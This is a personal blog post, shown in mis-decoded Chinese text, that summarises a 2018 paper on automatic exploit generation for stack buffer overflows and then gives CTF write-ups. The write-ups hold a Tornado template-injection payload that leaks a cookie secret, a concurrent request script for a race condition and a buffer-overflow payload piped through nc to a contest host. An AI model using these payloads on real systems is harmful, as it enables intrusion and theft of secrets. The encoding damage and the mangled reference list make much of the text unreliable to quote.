## 0x01 Paper

ã€ŠAutomatic Exploit Generation for Buffer Overflow Vulnerabilitiesã€‹2018 IEEE International Conference on Software Quality

IEEEä¼šè®®çš„æ–‡ç« ä¹Ÿå¯ä»¥è¿™ä¹ˆæ°´ï¼Ÿï¼Ÿï¼Ÿ

AEGå½“ç„¶éƒ½æ˜¯å…ˆæ‰¾æ¼æ´ç„¶ååœ¨exploitï¼Œæ„Ÿè§‰ä¸€èˆ¬éƒ½æ˜¯ç¼“å†²åŒºæº¢å‡ºçš„å¤šï¼Œè¿™ç¯‡æ–‡ç« ç ”ç©¶çš„**æ ˆä¸Šçš„bof**  
é¢ï¼Œè¿˜æ˜¯å¿ä¸ä½diss

åšäº†ä»€ä¹ˆï¼š
    1. AEGçš„åŸºæœ¬ï¼Œå®šä½+ç”ŸæˆExp  
    2. ç»•è¿‡NX+ALSR

#### 1. æ•´ä½“æ¡†æ¶å¦‚å›¾

![Framework](./2018-10-13/framework.jpg)

ç¬¬äºŒéƒ¨åˆ†ä½¿ç”¨BFSæ¥éå†ï¼ŒæŸ¥çœ‹IPæŒ‡é’ˆæŒ‡å‘çš„å€¼ï¼Œå¦‚æœè¿™ä¸ªå€¼è¶…è¿‡å¯è®¿é—®åœ°å€ï¼Œå°±æ˜¯æº¢å‡ºï¼Œè®°å¾—angré‡Œå¯ä»¥ç›´æ¥æ£€æµ‹ã€‚æ£€æµ‹è¿‡ç¨‹ä¸­è·³è¿‡äº†ç¼–è¯‘å™¨åœ¨ç¨‹åºå¤´æ·»åŠ çš„ä¸€äº›ä»£ç ã€‚  
ç¬¬ä¸‰éƒ¨åˆ†ä½¿ç”¨ret2libcç»•è¿‡NXï¼Œä½¿ç”¨"jmp esp"ç»•è¿‡ASLR


#### 2. ç»•è¿‡

è®¾è®¡äº†è¡¨è¾¾å¼æ¥æè¿°ï¼š

![expression](./2018-10-13/expression.png)

å¸¸è§„çš„bypassæ–¹æ³•ï¼š

![bypass](./2018-10-13/bypass.png)

#### 3. å®ç°+å®éªŒ

è¯´æ˜¯ç”¨çš„angrå’ŒRP++ï¼Œå…¶ä¸­angrçš„æ·±åº¦è®¾ç½®ä¸º400  
æµ‹è¯•é›†ä¸ºCGCå’ŒCsmithçš„ç”Ÿæˆæ•°æ®  

ä¹‹åè¯´äº†è¯´ç¼ºç‚¹ï¼Œäº˜å¤ä¸å˜çš„ç¼ºç‚¹ï¼šä¸èƒ½æ£€æµ‹å¤§ç¨‹åºå’Œè·¯å¾„çˆ†ç‚¸


#### 4. Reference

Heelan S. Automatic generation of control flow hijacking exploits for software vulnerabilities MI. 2009

Ramos D A, Engler D. Under-constrained symbolic execution correctness checking for real code [C Usenix Conference on Security Symposium. USENIX Association, 2015: 49-64

Stephens N, Grosen J, Salls C, et al. Driller: Augmenting fuzzing through selective symbolic execution C] Proceedings of the Network and Distributed System Security S ymposium. 2016

Hme M, Pham V T, Roychoudhury A. Coverage-based Greybox Fuzzing as Markov Chain [C] ACM Sigsac onference on Computer and Communications Security. ACM, 2016: 1032-1043

Kulenovic M, Donko D. A survey of static code analysis methods for security vulnerabilities detection [C International Convention on Information and Communication Technology, Electronics and Microelectronics. IEEE. 2014: 1381-1386

Pistoia M, Chandra S, Fink S J. Et al. A survey of static analysis methods for identifying security vulnerabilities in software systems J]. Ibm Systems Journal, 2007, 46 (2): 265-288

Bao T, Burket J, Woo M, et al. BYTE WEIGHT: learning to recognize functions in binary code [C Usenix Security Symposium. USENX Association. 2014

Hanov S Static Analysis of Binary Executables J]. Stevehanov Ca Eschweiler S. Y akdan K. Gerhards-padilla E. DISCOVRE. Efficient Cross Architecture Identification of Bugs in Binary Code C The Network and Distributed System Security Symposium. 2016

Wang S, Wang P, Wu D. Reassembleable disassembling [C Usenix Conference on Security Symposium. USENIX Association, 2015: 627 642.

Meng X, Miller B P. Binary code is not easy [C] International Symposium on Software Testing and Analysis. 2016: 24-35

Heelan S. Automatic generation of control flow hijacking exploits for software vulnerabilities MI. 2009

Avgerinos T, Sang K C, Rebert A, et al. Automatic exploit generation] Communications of the Acm, 2014, 57 (2): 74-84

Kapus T, Cadar C Automatic testing of symbolic execution engines via program generation and differential testing  [C Proceedings of the 32 nd IEEE/ACM International Conference on Automated Software

Engineering. IEEE Press, 2017: 590-600 Wang S, Wang P, Wu D. Reassembleable disassembling [] Usenix Conference on Security Symposium. USENIX Association, 2015: 627

Pewny J, Garmany B, Gawlik R, et al. Cross-architecture Bug Search in Binary Executables [C Security and Privacy. IEEE, 2015: 709-724

## 0x02 æŠ¤ç½‘æ¯

èœğŸ”

#### 1. web - easy tornado

é¢˜ç›®ç»™äº†ä¸‰ä¸ªé“¾æ¥ï¼š

hint.txt 
md5(cookie_secret + md5(filename))
hint.txt  b71a752e4d5388b9e3ab2dc1aebd8f21 9222bc1559ca9869cf9bd1eb651a9bc8

Orz.txt 
render()
Orz.txt 3ce480777eef4e1a694d678c8deb19fa 1f7f8b9a4759b67b66b9d02cbaaec4e0

flag.txt 
/fllllllllllag  
flag.txt 159df48875627e2f7f66dae584c5e3a5 e978ea3d6b7018e27f762ba225ba338f

ä¿é”™é“¾æ¥ï¼š/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF

msgå­˜åœ¨æ¨¡ç‰ˆæ³¨å…¥ï¼Œç„¶è€Œè¿‡æ»¤äº†`',(,_`ç­‰ï¼Œæƒ³æ‰¾æƒ³`config`è¿™æ ·çš„å…³é”®å­—ï¼Œæœªæœã€‚ã€‚ã€‚æƒ³æƒ³å¦‚æœè¦æ˜¯å…¨éƒ¨åŠŸèƒ½çš„SSTIå°±ä¸ç”¨æ¶‰åŠæç¤ºä¸­çš„md5äº†ï¼Œæ‰€ä»¥å°±æ˜¯è¯»å–é…ç½®æ–‡ä»¶è·å–cookie_secretã€‚ã€‚ã€‚ç„¶åè·‘åäº†åˆ°äº†Pythonæ²™ç›’é€ƒé€¸ï¼Œä¹‹åå¼€å§‹ç¿»tornadoæ–‡æ¡£ï¼Œè¯•äº†è¯•ä¸€äº›å…³é”®å­—ï¼Œç»ˆäºæ‰¾åˆ°äº†

> RequestHandler.settings  
> An alias for self.application.settings.

å•Šå˜¿ï½~`http://117.78.26.114:32389/error?msg={{%20handler.settings%20}}`ï¼Œå‡ºæ¥ï½ï½

> Whoops, looks like somethings went wrong .   
> {'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 's+Ke}?WMqHuoN${fRYjhDS1)k[lxgAwyO&V^_T<d@Up-QC!iGaItP.b3*%E]>#L0', 'debug': False, 'file_path': '/www/static/files', 'static_path': 'static'}

æ¨¡ç‰ˆæ³¨å…¥ç›¸å…³ï¼š

[websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)  
[server-side-template-injection](https://portswigger.net/blog/server-side-template-injection)


#### 2. web - ltshop

ç¬¬ä¸€æ„Ÿè§‰æ˜¯ç«äº‰ï¼Œç„¶åburpè·‘äº†ä¸€ä¸‹æœ€å¤šè·å¾—8ä¸ªå¤§è¾£æ¡ï¼Œæ¢ä¸äº†å‡ ä¸ªè¾£æ¡ä¹‹ç‹å°±æ›´åˆ«è¯´æ¢flagäº†ã€‚è¦è·‘å‡ åƒä¸‡ä¸ªå¤§è¾£æ¡ï¼Ÿï¼Ÿï¼Ÿ

å—¯ï¼Œç„¶åçœ‹äº†WPã€‚ã€‚ã€‚å…‘æ¢è¾£æ¡ä¹‹ç‹æ—¶æœ‰æº¢å‡ºï¼Œå½“æ—¶åªæ˜¯æµ‹äº†`-1`ï¼Œé¢ç§€é€—äº†ï¼Œä»¥ä¸ºè‡ªå·±æµ‹è¿‡æº¢å‡ºã€‚ã€‚ã€‚

æ˜¯ä¸ªuint64çš„æ•´æ•°ï¼ŒèŒƒå›´0-18446744073709551615ã€‚åå°çš„æ£€æµ‹åº”è¯¥æ˜¯"5*å…‘æ¢çš„æ•°é‡?<å·²æœ‰"ï¼Œæ‰€ä»¥å…‘æ¢æ•°é‡ä¸º3689348814741910324æ—¶ï¼Œå‘ç”Ÿæº¢å‡ºï¼ŒæˆåŠŸå…‘æ¢ï¼Œä¹Ÿå°±æœ‰ä¸ªå…‘æ¢flagçš„è¾£æ¡ä¹‹ç‹ã€‚

é™„ä¸€ä¸ªå¤šçº¿ç¨‹çš„ä»£ç ï¼š

```python

import multiprocessing
from requests.exceptions import RequestException
from requests.adapters import HTTPAdapter
import re, os, json, requests, time
import traceback

def main():
    url = 'http://117.78.26.114:30805/buylt'
    cookie = 'b7bc3d53-1291-420c-8745-0075fbebda2c'
    headers = {'Cookie':'go_iris_cookie='+ cookie}
    k = requests.post(url,headers=headers)
    print k.content

if __name__ == '__main__':
    results = []
    pool = multiprocessing.Pool(processes=20)
    for i in range(0xff):
        results.append(pool.apply_async(main,))
    pool.close()
    pool.join()
```

#### 3. crypto - FEZ

æºç ï¼š

```python
import os
def xor(a,b):
    assert len(a)==len(b)
    c=""
    for i in range(len(a)):
        c+=chr(ord(a[i])^ord(b[i]))
    return c
def f(x,k):
    return xor(xor(x,k),7)
def round(M,K):
    L=M[0:27]
    R=M[27:54]
    new_l=R
    new_r=xor(xor(R,L),K)
    return new_l+new_r

def unround(M, K):

def fez(m,K):
    for i in K:
        m=round(m,i)
    return m

K=[]
for i in range(7):
    K.append(os.urandom(27))
print K
m=open("flag","rb").read()
assert len(m)<54
m+=os.urandom(54-len(m))

test=os.urandom(54)
#test = "0b7361c8143e5935f9f5be3949cc07ed7a5ba6f258ebd91f29c5a7d16976f8dfb7fa422a6167281e573d015cc6d995841d5cab07923c".decode("hex")
print test.encode("hex")
print fez(test,K).encode("hex")
print fez(m,K).encode("hex")

```

æ‰‹åŠ¨ç®—ä¸€ç®—ï¼ŒåŠ å¯†æµç¨‹å°±æ˜¯ç©¿è¿›54ä½ï¼Œå‰27ä½ä¸ºAï¼Œå27ä½ä¸ºBï¼Œæœ€åç”Ÿæˆæ–°çš„54ä½ï¼Œå‰27ä½æ˜¯A^Xï¼Œå27ä½æ˜¯A^B^Yï¼Œå…¶ä¸­XYæ˜¯Kä¸­å‡ é¡¹çš„è¿ç®—ç»“æœï¼Œå¯ä»¥æ¨å‡ºXYçš„å€¼ï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°ç»“æœã€‚ã€‚ã€‚

#### 3. Pwn - gettingstart

é¢å‘µï¼Ÿæˆ‘æ˜¯äºŒè¿›åˆ¶é€‰æ‰‹ï¼Ÿï¼Ÿï¼Ÿåªæ°´äº†ä¸€é“æœ€ç®€å•çš„ã€‚å…¶ä¸­åˆä¸€ä¸ªåˆ¤æ–­å˜é‡æ˜¯å¦ç­‰äº0.1ï¼Œä¹‹åè‡ªå·±æ‰‹åŠ¨å†™äº†ä¸€ä¸ªåæ±‡ç¼–çœ‹ä¸€ä¸‹æ•°æ®çš„è¡¨ç¤ºã€‚

```python
(python -c "print 'A' * 24 + '\xff\xff\xff\xff\xff\xff\xff\x7f' + '\x9a\x99\x99\x99\x99\x99\xb9\x3f'";cat -) | nc 117.78.26.19 30838
```

